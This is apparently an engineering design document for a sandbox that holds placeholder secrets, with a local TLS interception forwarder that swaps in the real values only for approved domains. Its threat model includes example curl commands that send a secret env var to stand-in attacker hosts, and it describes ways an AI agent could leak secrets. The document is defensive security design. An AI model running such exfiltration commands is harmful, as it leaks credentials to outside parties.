# Sandbox secret swap via MITM egress

## Context

Today, sandbox env vars defined in the workspace admin (`WorkspaceSandboxEnvVar`)
are injected into the agent process at sandbox boot in plaintext. The agent UID
(`agent-proxied`, UID 1003) holds the real secret in its environment, which
makes the secret recoverable by any code path that touches the env: tool
stdout, file writes, network calls to allowlisted domains, transformed/encoded
echoes, or LLM social engineering.

The current mitigation is `formatExecOutput` (PR #25051), which scans tool
stdout for high-entropy substrings and replaces them with redaction markers.
The PR description openly acknowledges what it doesn't catch: encoded output,
network calls from sandbox code, transformed values, dictionary-like values.
An agent doing `curl -X POST https://attacker.com -d "$DST_FOO"` walks past
redaction and is only stopped by the egress domain allowlist.

The set of upstreams the sandbox can reach is broad: the global default
allowlist merged with per-workspace and per-sandbox policies stored in the GCS
policy bucket. Workspaces add their own domains (Slack, Stripe, GitHub,
internal APIs) via `add_egress_domain` and the workspace admin UI. So "an
allowlisted but unrelated domain receives the secret" is a realistic exfil
path.

## Goals

- The agent process never holds the real secret. Its environment contains a
  deterministic, opaque placeholder.
- The placeholder is substituted with the real value just-in-time, on the
  request path leaving the sandbox, before bytes hit the upstream.
- The substitution is gated on a per-secret destination allowlist, so the
  secret is only released to upstreams the admin has explicitly approved for
  that secret.
- The mechanism is transparent to the default HTTPS client of every
  mainstream language (curl, Python, Node, Bun, Deno, Go, Java, Ruby, PHP,
  Rust with native-tls). No agent code changes required.
- Failure modes are loud (TLS error, connection refused) rather than silent
  (placeholder reaches upstream as garbage).

## Non-goals

- Defending against a sandbox-VM root compromise. The sandbox VM remains a
  single-tenant VM trusted to hold per-sandbox secrets, bounded by the egress
  proxy. Kernel/container escape is out of scope, the blast radius is the
  same as today's plaintext env.
- Defending against cert-pinning clients. By design, a client that pins a
  specific CA or leaf will refuse the dsbx-forged leaf and fail to connect.
  This is correct behavior and we don't try to work around it.
- Substituting secrets in non-HTTP protocols (Postgres TLS, Redis TLS, raw
  TLS sockets). The 80/20 case is HTTPS APIs with header-based auth.
- Replacing the central egress proxy's allowlist enforcement. The per-secret
  allowlist is a stricter overlay, not a substitute.

## Proposal

Place the MITM in `dsbx`, the per-sandbox forwarder we already run as root.
Generate an ephemeral CA at sandbox boot, terminate the agent's outbound
TLS in dsbx, rewrite HTTP headers/URLs containing the placeholder, and
re-encrypt outbound to the upstream (still tunneled through the central
egress proxy). The central egress proxy keeps doing TCP splice; no MITM
state lives there.

### Why dsbx and not the central egress proxy

| Property | dsbx (chosen) | Central egress proxy |
| --- | --- | --- |
| Real secret lives in | sandbox VM, dsbx (root, 0600) | proxy pod only |
| CA private key blast radius | per-sandbox, ephemeral, memory-only | one CA signs leaves for every domain in every workspace |
| TLS terminations on the path | one extra (dsbx) | one extra (proxy) |
| Code change weight | one binary (~1000-1500 LOC including tests) | proxy + secret store + CA mgmt + per-conn key fetches on a regional hot path |
| Agent reach to real secret | requires sandbox root escape | impossible from sandbox |

The central-proxy variant has nicer "secret never enters the VM" properties
but the CA-private-key concentration is a tier-1 secret backing every
workspace's outbound TLS, the proxy turns from a thin TCP splice into a full
HTTP/1.1+HTTP/2+websocket parser with body buffering and Content-Length
recomputation, and the per-connection secret fetches add latency to every
egress. The dsbx variant accepts that a sandbox-root escape leaks that
sandbox's secrets, same blast radius as today's plaintext env vars for
those secrets, in exchange for a much smaller and more localized
implementation.

### Placeholder format

```
__DST_SECRET_<32 hex chars>__
```

where the hex is `HMAC_SHA256(per-workspace-key, name || ":" || version)`
truncated to 16 bytes.

Properties:

- Fixed width, alphanumeric: safe to embed in shell, JSON, headers, URLs.
- Greppable regex: `__DST_SECRET_[0-9a-f]{32}__`.
- Deterministic per (workspace, name, version): stable across boots until
  the row is rotated. Rotation bumps `version`, which rotates the
  placeholder, which forces persisted agent state to break loudly.
- No information leakage: doesn't reveal the secret, its length, or allow
  the agent to forge a placeholder for a value it doesn't know.

### Substitution logic

In dsbx, branch by port in `handle_connection`:

- **Port 443 (HTTPS)**: Peek SNI as today. Forge a leaf cert for the SNI
  signed by the in-process CA. Terminate inbound TLS on dsbx with that
  leaf. Open outbound TLS toward the real upstream (still tunneled through
  the central egress proxy on 4443). On the decrypted inner stream, run an
  HTTP/1.1 or HTTP/2 (selected by ALPN) header/URL rewriter. Re-encrypt
  outbound.
- **Port 80 (HTTP)**: Terminate TCP, run an HTTP/1.1 parser (`httparse`),
  rewrite headers/URL, re-emit.
- **Other ports (raw TCP)**: Pass through unchanged. Optional hardening:
  if a placeholder appears on a raw TCP connection, drop the connection.

Substitution is gated on a per-secret destination allowlist:

```
secret.allowedDomains: string[]   // e.g. ["api.openai.com"]
```

dsbx replaces `__DST_SECRET_<h>__` only if the destination domain is in
the matching secret's `allowedDomains`. Otherwise the placeholder passes
through to the upstream unchanged, which will reject the request with an
auth error (loud failure). The placeholder-to-non-allowed-domain event
is logged on the existing deny-log channel.

This is the security-critical control. It stops `curl
https://attacker-allowlisted-by-egress-policy.com -H "X: $DST_FOO"` even
when that domain is on the egress allowlist for some unrelated reason.
The per-secret allowlist is stricter than (and orthogonal to) the egress
domain policy.

### Header-only initially, body later

Phase 1 covers headers and URL only. The common API auth case
(`Authorization`, `X-API-Key`, `Cookie`) is fully covered. Bodies (OAuth
`client_secret`, webhook signing, multipart forms) come in Phase 2 with an
`includeBody` flag on each secret row.

### Client-language agnosticism

The interception is below the language runtime:

- nftables `REDIRECT` keys on `meta skuid 1003` at the kernel netfilter
  hook. Every `connect()` from the agent UID is rerouted to dsbx
  regardless of libc, runtime, or static linkage.
- The byte-level rewriter inside dsbx parses wire bytes after TLS
  termination; it doesn't introspect the client.
- DNS for the agent UID is pinned to configured resolvers via nftables;
  DoH/alternative resolvers fail closed.
- UDP/ICMP from UID 1003 is dropped, so HTTP/3/QUIC silently falls back
  to HTTP/2 on TCP.

The only runtime-specific surface is **TLS trust**. For dsbx's forged
leaf to be accepted, the agent's HTTPS client must trust the dsbx-issued
local CA. Different stacks read trust roots from different places, and
trust env vars have different semantics, some replace the trust bundle
entirely, others append. Misconfiguring this silently breaks non-MITM TLS
to public sites.

| Stack | System store | Env knob | Knob semantics |
| --- | --- | --- | --- |
| curl / wget / OpenSSL CLIs | yes | `CURL_CA_BUNDLE`, `SSL_CERT_FILE` | replace |
| Go (`crypto/tls` on Linux) | yes | `SSL_CERT_FILE`, `SSL_CERT_DIR` | replace |
| Ruby, PHP, Perl | yes | `SSL_CERT_FILE` | replace |
| Python `ssl` stdlib | yes | `SSL_CERT_FILE` | replace |
| Python `requests` / `httpx` | no | `REQUESTS_CA_BUNDLE`, `SSL_CERT_FILE` | replace |
| Node.js | no | `NODE_EXTRA_CA_CERTS` | append (startup only) |
| Bun | no | `NODE_EXTRA_CA_CERTS` (verify) | append (claimed) |
| Deno | no | `DENO_CERT` + `DENO_TLS_CA_STORE` | append |
| Rust `reqwest` (rustls-webpki) | no | none | not configurable |
| Rust `reqwest` (native-tls / rustls-native-certs) | yes | `SSL_CERT_FILE` | replace |
| Java / JVM | no | none | keystore `keytool -import` at boot |
| AWS SDKs | no | `AWS_CA_BUNDLE` | replace |
| Git over HTTPS | yes | `GIT_SSL_CAINFO` | replace |

The replace/append distinction drives the trust setup. The sandbox image
maintains two files and points each env var at the right one:

1. **Install the dsbx-issued CA into the system store** at boot:
   ```
   cp /etc/dust/egress-ca.pem /usr/local/share/ca-certificates/dust-egress.crt
   update-ca-certificates
   ```
2. **Maintain `/etc/dust/ca-bundle.pem` = system bundle ∪ dust-egress
   CA**, computed at boot from `/etc/ssl/certs/ca-certificates.crt`. This
   is what replace-style env vars point at.
3. **Export env vars system-wide** in `/etc/environment` and the agent
   user's profile. Replace-style vars get the bundle; append-style vars
   get the single-CA file:
   ```
   # replace-style, must contain the full trust set
   SSL_CERT_FILE=/etc/dust/ca-bundle.pem
   SSL_CERT_DIR=/etc/ssl/certs
   CURL_CA_BUNDLE=/etc/dust/ca-bundle.pem
   REQUESTS_CA_BUNDLE=/etc/dust/ca-bundle.pem
   AWS_CA_BUNDLE=/etc/dust/ca-bundle.pem
   GIT_SSL_CAINFO=/etc/dust/ca-bundle.pem

   # append-style, single CA, added to the runtime's built-in bundle
   NODE_EXTRA_CA_CERTS=/etc/dust/egress-ca.pem
   DENO_CERT=/etc/dust/egress-ca.pem
   DENO_TLS_CA_STORE=system,mozilla
   ```
4. **Java keystore import at boot** (the CA is ephemeral per boot):
   ```
   keytool -importcert -noprompt -trustcacerts \
     -alias dust-egress -file /etc/dust/egress-ca.pem \
     -keystore "$JAVA_HOME/lib/security/cacerts" -storepass changeit
   ```
5. **Boot order**: dsbx starts and writes the CA → env exports happen →
   the agent gets to spawn anything. `NODE_EXTRA_CA_CERTS` is read at
   process startup only, so processes spawned before the env is set
   don't pick it up. This is the same ordering already used for the
   JWT/forwarder setup.
6. **Skill prompt guidance**: instruct the agent not to override trust
   in code (no `verify=` on requests/httpx, no `ca:` on Node, no custom
   `RootCAs` in Go, no private trust managers in Java). If it does, the
   call fails because dsbx's leaf isn't trusted. The
   placeholder-unsubstituted event surfaces in the deny log to avoid
   silent debugging spirals.

### Known limits, by design

- **Rust `reqwest` against `webpki-roots`**: hardcoded Mozilla bundle
  compiled into the binary, no env var reaches it. Mitigation: pre-seed
  `~/.cargo/config.toml` to favor `rustls-native-certs`, or document and
  let it fail loudly. No silent secret leak.
- **Cert-pinning clients**: by design, they reject the dsbx leaf. We
  don't try to MITM a pinning client. Empirically rare in agent-written
  code.
- **Long-lived processes started before env export**: don't pick up the
  trust. Boot order is enforced.
- **Non-HTTP protocols over TLS** (Postgres, MySQL, Redis, SMTP STARTTLS,
  raw TLS): dsbx terminates inbound TLS but the rewriter only understands
  HTTP/1.1 and HTTP/2. The placeholder reaches upstream and is rejected
  as garbage. Per-protocol rewriters are Phase 3+, opt-in by domain.
- **HTTP/3 / QUIC**: UDP is already dropped for UID 1003. Clients fall
  back to HTTP/2 on TCP. Preserved.
- **Encoded placeholders**: if the agent base64s, url-encodes, or splits
  the placeholder across headers, the rewriter doesn't recognize it and
  doesn't substitute. Upstream gets garbage. This is a feature: any
  transformation breaks substitution and the secret is never produced.

### Verification

A smoke matrix runs per stack on every dsbx release: one MITM'd domain
(placeholder must materialize as the real secret upstream), one non-MITM
public domain (TLS must still verify against the public web).

```
# baseline
curl https://api.allowed-mitm.example/   # MITM → real secret in headers
curl https://www.google.com/             # non-MITM → must verify

# Python
python -c "import urllib.request; urllib.request.urlopen('https://...')"
python -c "import requests; requests.get('https://...')"
python -c "import httpx; httpx.get('https://...')"

# JS runtimes
node -e "fetch('https://...').then(r=>r.text())"
bun  -e "fetch('https://...').then(r=>r.text())"
deno eval "await fetch('https://...')"

# Compiled
go run /tmp/get.go                                 # net/http
java GetURL                                        # post-keytool
cargo run                                          # reqwest+native-tls
cargo run                                          # reqwest+rustls-webpki, EXPECTED FAIL

# Misc
ruby -rnet/http -e "Net::HTTP.get(URI('https://...'))"
php -r "file_get_contents('https://...');"
git clone https://github.com/...
aws s3 ls
wget https://...
```

Each case asserts the public domain succeeds and the controlled MITM
upstream records the real secret in the captured `Authorization` header.

## Phases

### Phase 0, minimal end-to-end PoC (this PR)

Purpose: prove the substitution path works end-to-end before investing in
the full design. If Phase 0 works, every load-bearing claim, kernel-level
REDIRECT, dsbx TLS termination with an ephemeral CA, byte rewriting,
re-encryption surviving the central proxy splice and upstream TLS,
observable arrival upstream, is demonstrated.

In scope:

- Hard-coded substitution in dsbx:
  ```
  __DUST_EXPERIMENT_PLACEHOLDER__   →   __SUCCESSFULLY_REPLACED________
  ```
  Both 31 bytes (including leading/trailing `__`). Equal length avoids
  HTTP framing complications.
- HTTP/1.1 request headers only. No response rewriting, no body, no URL,
  no HTTP/2.
- Substitution is unconditional when the placeholder is present. No
  `allowedDomains`, no per-secret table, no JWT cross-check.
- TLS MITM via ephemeral in-memory CA generated at dsbx startup.
- Trust setup limited to `update-ca-certificates` plus `SSL_CERT_FILE`
  and `CURL_CA_BUNDLE` pointing at `/etc/dust/ca-bundle.pem`. curl is
  the only client used in Phase 0.
- New endpoint on `front`: `POST/GET /api/v1/w/[wId]/sandbox/egress-experiment`,
  gated by a shared bearer token in `X-Dust-Experiment-Token`. Returns
  `404` unless both `EGRESS_MITM_EXPERIMENT_HOST` and
  `EGRESS_MITM_EXPERIMENT_TOKEN` are set; `401` on missing/wrong token.
  Logs the inbound `X-Dust-Experiment` header to Datadog and echoes it
  back. No DB writes.
- Smoke flow runnable from inside the sandbox. The shared token is
  injected as `$DUST_EXPERIMENT_TOKEN` whenever the experiment is
  enabled:
  ```
  curl -H "X-Dust-Experiment: __DUST_EXPERIMENT_PLACEHOLDER__" \
       -H "X-Dust-Experiment-Token: $DUST_EXPERIMENT_TOKEN" \
       https://<experiment-host>/api/v1/w/<wId>/sandbox/egress-experiment
  ```
  Expected: Datadog log `received == "__SUCCESSFULLY_REPLACED________"`.
- Control case: literal non-placeholder header value passes through
  unchanged.

Out of scope for Phase 0:

- DB schema changes, model migrations, admin UI.
- Changes to the existing `WorkspaceSandboxEnvVar` flow.
- The HMAC-derived `__DST_SECRET_<32hex>__` format.
- The `/etc/dust/egress-secrets.json` per-sandbox file.
- `allowedDomains` gating, deny-log enrichment.
- Trust coverage beyond curl (Node, Python, Java, Rust, Bun, Deno, Go).
- HTTP/2, body rewriting, URL rewriting, websocket Upgrade, non-HTTP
  protocols, plain HTTP on port 80.
- Any change to the central egress proxy.

Acceptance criteria:

1. `curl` with the placeholder reaches the endpoint and Datadog shows
   the substituted value.
2. `curl` with a literal non-placeholder string reaches the endpoint
   unchanged.
3. A non-MITM `curl https://www.google.com/` from the same sandbox
   still succeeds (sanity for the trust bundle).
4. The dsbx MITM stage is scoped to the experiment domain so unrelated
   production traffic isn't intercepted.

Implementation footprint:

- `cli/dust-sandbox`: ~200-400 LOC plus tests. Ephemeral CA via `rcgen`,
  per-SNI leaf signing with an LRU cache, single-rule substring replacer
  on HTTP/1.1 request headers, scoped to the experiment hostname.
- `front`: ~50-100 LOC. One endpoint file, one swagger annotation, one
  functional test.
- Sandbox image: ~20 lines in the boot sequence to install the CA and
  point `SSL_CERT_FILE`/`CURL_CA_BUNDLE` at the merged bundle.
- Central egress proxy: no change.

### Two classes of sandbox env vars

The `WorkspaceSandboxEnvVar` model splits into two distinct classes,
with different semantics and different injection paths:

1. **Config vars** (the `WorkspaceSandboxEnvVar` of today). Plain
   strings meant to be used offline inside the sandbox: feature flags,
   non-sensitive config, default region, etc. Injected as-is into the
   agent env. Not substituted on the wire. Not bound to a domain. The
   bash-output redactor still applies to these (best-effort, since
   they're in env in plaintext).
2. **Secrets** (new). Sensitive values meant to be used in HTTPS
   requests only, scoped to a per-secret `allowedDomains` list. The
   agent env contains only the placeholder; the real value lives in
   `/etc/dust/egress-secrets.json` (root, 0600) and is substituted
   on the wire by dsbx when the destination domain matches the
   secret's allowlist. Cannot be used offline (no real value in env).

Admins pick the class when creating the row. Migration path for
existing rows: leave them as config vars by default; admins explicitly
promote sensitive ones to secrets and set `allowedDomains` at promotion
time.

### Phase 1, MVP - HTTP/1.1

- HTTP/1.1 only on port 443 (force HTTP/1 via ALPN), headers + URL only.
- HMAC-derived `__DST_SECRET_<32hex>__` placeholder.
- `WorkspaceSandboxEnvVar` split into config vars and secrets (see
  above). Secrets gain `allowedDomains: string[]` and `version: int`.
- `front` writes `/etc/dust/egress-secrets.json` (root, 0600) per
  sandbox, alongside the JWT.
- `buildSandboxEnvVars` injects placeholders for secrets, real values
  for config vars.
- Trust coverage: Node, Python, Bun, Deno, Go, Java (keytool at boot),
  Rust (native-tls), AWS SDKs, Git. Replace-style vs append-style env
  vars set per the matrix above. Rust webpki and cert-pinning clients
  documented as known holes that fail loudly.
- Bash redactor (#25051) keeps applying to config vars (defense in
  depth for plaintext-in-env). Skill prompt updated to tell the agent
  secrets will substitute on the wire and not to second-guess env.
- Admin UI: secrets get an `allowedDomains` column; the create flow
  asks for the class up front.
- Audit log: per-secret allowlist changes, class promotions.
- Estimate: ~2 engineer-weeks.

### Phase 2, MVP - HTTP/2

HTTP/2 is part of the MVP - we don't ship without it - but it's
sequenced after Phase 1 so we can land the substitution pipeline first
and validate it on h1 before adding frame-level complexity.

- HTTP/2 frame-level rewriter (h2 crate), HPACK-aware so the
  placeholder is recognized whether the header value is sent literally
  or after dynamic-table indexing.
- ALPN negotiation lets clients pick h2 again (Phase 1 forces h1).
- Same trust/allowlist/placeholder model as Phase 1.

### Phase 3, body substitution

- Body scan + Content-Length recomputation, opt-in per secret via an
  `includeBody` flag.
- Multipart form boundary handling.
- Chunked transfer encoding.

### Phase 4+, tail cases

- Websocket Upgrade.
- Plain HTTP on non-standard ports (protocol detection from peek bytes
  rather than port keying).
- Per-protocol rewriters for non-HTTP TLS (Postgres, MySQL, Redis), opt
  in by domain.

## Resolved decisions

- **HTTP/2**: part of the MVP (we don't GA without it) but sequenced as
  Phase 2 after the h1 pipeline lands and is validated.
- **Body substitution**: not in Phase 1. Headers + URL only. OAuth
  `client_secret`, webhook signing, and multipart forms come in Phase 3
  with an opt-in `includeBody` flag. Advertise the limit loudly in the
  admin UI when admins create a secret.
- **Bash redactor (#25051)**: kept, but only applies to config vars (the
  plaintext-in-env class). Secrets don't need it: the placeholder is
  what's in env, not the real value.
- **Trust coverage**: full mainstream coverage in Phase 1 (Node, Python,
  Bun, Deno, Go, Java, Rust native-tls, AWS SDKs, Git). Rust
  `rustls-webpki` and cert-pinning clients documented as known holes
  that fail loudly.

## Open questions

1. **Cross-sandbox replay**: if an agent persists a placeholder string
   in a database we control and replays it from another sandbox, that
   sandbox has a different `version` and substitution fails. Document
   that placeholders are sandbox-version-bound.
2. **`kernel.yama.ptrace_scope`**: confirm we set it ≥ 1 in the sandbox
   image so a compromised UID 1003 can't ptrace dsbx. Worth confirming
   regardless of this work, would be a finding for the redaction PR.
3. **CA private-key handling**: keep the CA private key memory-only
   (never on disk), and forbid the agent UID from reading
   `/etc/dust/egress-ca.pem`. The CA cert is public; the key is the
   sensitive half.
4. **Skill prompt update**: revise
   `lib/resources/skill/code_defined/sandbox.ts` to tell the agent
   secrets will substitute on the wire, distinguish them from config
   vars, and not to second-guess env or attempt to extract a real
   secret value.
5. **Migration of existing rows**: existing `WorkspaceSandboxEnvVar`
   rows default to config vars on rollout. Do we proactively flag rows
   whose names look secret-shaped (`*_TOKEN`, `*_KEY`, `*_SECRET`) for
   admin review, or leave promotion fully manual?
